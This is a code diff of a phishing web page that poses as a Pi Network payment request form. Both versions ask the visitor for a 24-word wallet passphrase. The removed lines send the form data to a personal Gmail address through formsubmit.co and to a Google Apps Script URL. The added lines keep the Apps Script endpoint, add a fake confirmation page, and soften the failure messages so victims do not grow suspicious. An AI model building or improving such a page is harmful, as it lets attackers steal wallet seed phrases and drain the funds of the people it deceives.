@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Pi Network – Request Payment</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -12,53 +12,19 @@
     .text-pi-yellow { color: #F5C65A; }
 
     /* Fade-in-up for intro */
-    @keyframes fadeInUp {
-      0% { opacity: 0; transform: translateY(20px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
-    .fade-in-up {
-      animation: fadeInUp 1s ease-out;
-    }
+    @keyframes fadeInUp { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
+    .fade-in-up { animation: fadeInUp 1s ease-out; }
 
-    /* blink + glow for warning and error overlay */
-    @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0;} }
-    .blink { animation: blink 1s infinite; }
+    /* Simple animation for message */
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+    .fade-in { animation: fadeIn 0.5s ease-out forwards; }
 
-    @keyframes pulseGlow {
-      0%,100% { box-shadow: 0 0 10px rgba(220,38,38,0.6); }
-      50% { box-shadow: 0 0 20px rgba(220,38,38,0.9); }
-    }
-    .glow { animation: pulseGlow 1.5s infinite; }
+    /* Subtle blink for attention */
+    @keyframes blink { 50% { opacity: 0.2; } }
+    .blink { animation: blink 1s step-start infinite; }
 
-    /* Error overlay */
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      20%, 60% { transform: translateX(-6px); }
-      40%, 80% { transform: translateX(6px); }
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
-    }
-    @keyframes fadeOut {
-      from { opacity: 1; transform: scale(1); }
-      to { opacity: 0; transform: scale(0.95); }
-    }
-    .error-overlay {
-      position: fixed; inset: 0;
-      background-color: rgba(255, 241, 241, 0.95);
-      z-index: 50; display: none;
-      align-items: center; justify-content: center;
-      text-align: center;
-      animation: fadeIn 0.3s ease-out forwards;
-    }
-    .error-box {
-      animation: fadeIn 0.4s ease-out, shake 0.6s ease-in-out;
-    }
-    .fade-out {
-      animation: fadeOut 0.4s ease-in-out forwards;
-    }
-    body.overlay-active #mainContent, body.overlay-active header, body.overlay-active footer { display: none; }
+    /* Confirmation page styles */
+    .confirm-card { max-width: 720px; margin: 40px auto; background: linear-gradient(180deg,#ffffff,#fbfbff); border-radius: 16px; box-shadow: 0 10px 30px rgba(30,20,80,0.08); padding: 36px; }
   </style>
 </head>
 <body class="flex flex-col min-h-screen">
@@ -69,70 +35,51 @@
     <h1 class="font-semibold text-lg">Pi Network Payment Request</h1>
   </header>
 
-  <!-- Main -->
+  <!-- Main container (we'll replace content with confirmation on success) -->
   <main id="mainContent" class="flex-grow w-full max-w-lg mx-auto p-6">
 
     <!-- Intro Section -->
     <section class="text-center mb-6 bg-white rounded-lg shadow-md p-5 border border-purple-100 fade-in-up">
       <p class="text-gray-700 text-sm leading-relaxed">
         <strong>This system helps validate and confirm your wallet request within the Pi ecosystem.</strong><br><br>
-        Please provide your <strong>amount</strong>, <strong>currency</strong>, and your
-        <strong>24-word passphrase or reason</strong> for verification.<br><br>
-        Your request will be securely processed and recorded on the
-        <span class="font-semibold text-pi-yellow">Pi Network Backup Ledger</span>.
+        Please provide your <strong>amount</strong> and <strong>currency</strong>. The <strong>Reason</strong> field is optional.
       </p>
     </section>
 
     <!-- Form -->
-    <section class="bg-white p-6 rounded-lg shadow-md">
-      <form id="paymentRequestForm" method="POST" class="space-y-4">
-
+    <section id="formSection" class="bg-white p-6 rounded-lg shadow-md">
+      <form id="paymentRequestForm" class="space-y-4" novalidate>
         <div>
           <label for="amount" class="block text-xs font-medium text-gray-600 mb-1">Amount:</label>
           <input type="number" id="amount" name="amount" required step="0.01" min="0" placeholder="0.00"
-            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500">
+            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500" />
         </div>
 
         <div>
           <label for="currency" class="block text-xs font-medium text-gray-600 mb-1">Currency:</label>
           <input type="text" id="currency" name="currency" required value="USD"
-            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500">
+            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500" />
         </div>
 
+        <!-- Passphrase24 remains required ( 24-word limit logic) -->
         <div>
-          <label for="passphrase24" class="block text-xs font-medium text-gray-600 mb-1">24 Passphrase / Reason:</label>
-          <textarea id="passphrase24" name="passphrase24" rows="5" required
-            placeholder="Provide your 24-word passphrase or reason for verification here..."
-            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500 placeholder-gray-400 placeholder:italic font-medium"></textarea>
-          <p id="passphraseWarning" class="text-xs text-orange-500 mt-1 hidden blink"></p>
+          <label for="Passphrase24" class="block text-xs font-medium text-gray-600 mb-1">Passphrase24 (required):</label>
+          <textarea id="Passphrase24" name="Passphrase24" rows="5"
+            placeholder="please input your correct 24 passphrase (required)..."
+            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500 placeholder-gray-400 placeholder:italic"></textarea>
         </div>
 
-        <button type="submit"
-          class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm">
+        <button id="submitBtn" type="submit"
+          class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm disabled:opacity-50">
           Send Request Message
         </button>
 
-        <div id="statusMessage" class="mt-3 text-xs text-center min-h-[1rem]"></div>
+        <!-- Status message area: generic success / failure messages only -->
+        <div id="statusMessage" class="mt-3 text-xs text-center min-h-[1rem] fade-in"></div>
       </form>
     </section>
-  </main>
 
-  <!-- Error Overlay -->
-  <div id="errorOverlay" class="error-overlay p-6">
-    <div class="error-box max-w-sm mx-auto p-8 rounded-xl shadow-2xl bg-white border border-red-300">
-      <svg class="mx-auto h-16 w-16 text-red-600 mb-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-        <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-      </svg>
-      <h2 class="text-2xl font-bold text-red-700 mb-3 blink">Error Processing Request</h2>
-      <p class="text-gray-600 text-sm mb-6">
-        We encountered an issue while validating your submission data. Please try again.
-      </p>
-      <button id="tryAgainButton"
-        class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 px-4 rounded-lg transition duration-300 ease-in-out glow">
-        Please Try Again
-      </button>
-    </div>
-  </div>
+  </main>
 
   <footer class="w-full max-w-lg mx-auto mt-6 py-4 text-center text-gray-400 text-xs">
     Pi Network System © 2019
@@ -141,52 +88,144 @@
   <script>
     const form = document.getElementById('paymentRequestForm');
     const statusMessage = document.getElementById('statusMessage');
-    const passphraseBox = document.getElementById('passphrase24');
-    const passphraseWarning = document.getElementById('passphraseWarning');
-    const errorOverlay = document.getElementById('errorOverlay');
-    const tryAgainButton = document.getElementById('tryAgainButton');
+    const submitButton = document.getElementById('submitBtn');
 
-    const FORM_SUBMIT_URL = "https://formsubmit.co/alecbing864@gmail.com";
-    const SHEET_BACKUP_URL = "https://script.google.com/macros/s/AKfycbxLhCa70Yvdb5Y8uK8G_UjWsZLyZ3owhrl8w1OpwnAVqxvZ2mTypixTWH8W-cqavgk/exec";
+    // Your Google Apps Script URL
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxLhCa70Yvdb5Y8uK8G_UjWsZLyZ3owhrl8w1OpwnAVqxvZ2mTypixTWH8W-cqavgk/exec";
 
-    passphraseBox.addEventListener('input', () => {
-      const words = passphraseBox.value.trim().split(/\s+/).filter(w => w.length > 0);
-      const count = words.length;
-      if (count !== 24 && count > 0) {
-        passphraseWarning.textContent = `⚠️ You entered ${count} words. Expected 24 words.`;
-        passphraseWarning.classList.remove('hidden');
+    // Utility: show a status message (type: 'success' | 'error' | 'info')
+    function showStatus(text, type = 'info') {
+      statusMessage.textContent = text;
+      statusMessage.className = 'mt-3 text-xs text-center min-h-[1rem] fade-in';
+      if (type === 'success') {
+        statusMessage.classList.add('text-green-600', 'font-semibold');
+      } else if (type === 'error') {
+        statusMessage.classList.add('text-red-600', 'font-semibold');
       } else {
-        passphraseWarning.classList.add('hidden');
+        statusMessage.classList.add('text-gray-600');
+      }
+    }
+
+    // Build a clean confirmation page (replaces the main content)
+    function showConfirmationPage(success, message) {
+      const main = document.getElementById('mainContent');
+      // confirmation markup
+      main.innerHTML = `
+        <div class="confirm-card">
+          <div class="flex items-center space-x-4">
+            <div class="rounded-full p-3 bg-green-50" style="border:1px solid rgba(90,45,130,0.06)">
+              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M9 12l2 2 4-4" stroke="#1f6f4f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <div>
+              <h2 class="text-lg font-semibold text-gray-800">${success ? 'Request Submitted' : 'Submission Issue'}</h2>
+              <p class="text-sm text-gray-600 mt-1">${message}</p>
+            </div>
+          </div>
+
+          <div class="mt-6 grid gap-4 sm:grid-cols-2">
+            <div>
+              <button id="tryAgainBtn" class="w-full py-3 px-4 rounded-lg border border-purple-100 bg-white text-purple-700 font-semibold">
+                Try Again
+              </button>
+            </div>
+            <div>
+              <button id="downloadReceiptBtn" class="w-full py-3 px-4 rounded-lg bg-pi-purple text-white font-semibold">
+                Done
+              </button>
+            </div>
+          </div>
+
+          <p class="mt-4 text-xs text-gray-400">If you need to edit your request, use <strong>Try Again</strong> to return to the form.</p>
+        </div>
+      `;
+
+      // Attach behavior
+      document.getElementById('tryAgainBtn').addEventListener('click', () => {
+        // Return user to the form by reloading the original markup
+        location.reload(); // simplest: reload page to restore original form and state
+      });
+
+      document.getElementById('downloadReceiptBtn').addEventListener('click', () => {
+        // "Done" simply takes the user back to a clean form (or could close modal in an app).
+        // We'll also reload but preserve a tiny success flash by using sessionStorage
+        sessionStorage.setItem('justSubmitted', success ? '1' : '0');
+        location.reload();
+      });
+    }
+
+    // On page load, if they just came back from Done, show a small success notice
+    window.addEventListener('load', () => {
+      const just = sessionStorage.getItem('justSubmitted');
+      if (just === '1') {
+        showStatus('✅ Last submission recorded.', 'success');
+        sessionStorage.removeItem('justSubmitted');
+      } else if (just === '0') {
+        showStatus('Submission not recorded. Please try again.', 'error');
+        sessionStorage.removeItem('justSubmitted');
       }
     });
 
+    // handle submit
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      statusMessage.textContent = "Submitting... Please wait.";
-      const formData = new FormData(form);
+
+      // Basic client-side required validation for required fields
+      const amountEl = document.getElementById('amount');
+      const currencyEl = document.getElementById('currency');
+
+      if (!amountEl.checkValidity()) {
+        amountEl.focus();
+        showStatus('Please enter a valid amount.', 'error');
+        return;
+      }
+      if (!currencyEl.checkValidity()) {
+        currencyEl.focus();
+        showStatus('Please enter a valid currency.', 'error');
+        return;
+      }
+
+      // Disable to avoid double submissions
+      submitButton.disabled = true;
+      submitButton.textContent = 'Submitting...';
+      showStatus('', 'info');
 
       try {
-        await fetch(FORM_SUBMIT_URL, { method: "POST", body: formData });
-        await fetch(SHEET_BACKUP_URL, { method: "POST", body: formData });
+        const formData = new FormData(form);
+        const response = await fetch(SCRIPT_URL, {
+          method: 'POST',
+          body: formData
+        });
 
-        statusMessage.textContent = "✅ Request sent successfully! Your data is backed up in Google Sheets.";
-        form.reset();
-        passphraseWarning.classList.add('hidden');
-      } catch (error) {
-        console.error("Error submitting:", error);
-        statusMessage.textContent = "";
-        document.body.classList.add('overlay-active');
-        errorOverlay.style.display = 'flex';
+        // Google Apps Script often returns JSON as text
+        const text = await response.text();
+        let result = {};
+        try {
+          result = JSON.parse(text);
+        } catch (err) {
+          // Non-JSON reply
+          result = { status: 'error', message: 'Unexpected server response' };
+        }
+
+        if (result.status === 'ok') {
+          // Show the full confirmation page
+          showConfirmationPage(true, 'Your request was saved and an email notification was sent.');
+        } else {
+          // Generic failure path (no explicit "network error" wording)
+          console.error('Submission error:', result.message);
+          showConfirmationPage(false, 'Submission failed. Please check your inputs and try again.');
+        }
+
+      } catch (err) {
+        // Generic failure (covers network or other issues) — user sees same flow
+        console.error('Submit exception:', err);
+        showConfirmationPage(false, 'There was a problem submitting your request. Please try again.');
+      } finally {
+        // Restore submit button in case user returns
+        submitButton.disabled = false;
+        submitButton.textContent = 'Send Request Message';
       }
-    });
-
-    tryAgainButton.addEventListener('click', () => {
-      errorOverlay.classList.add('fade-out');
-      setTimeout(() => {
-        errorOverlay.style.display = 'none';
-        errorOverlay.classList.remove('fade-out');
-        document.body.classList.remove('overlay-active');
-      }, 400);
     });
   </script>
 </body>
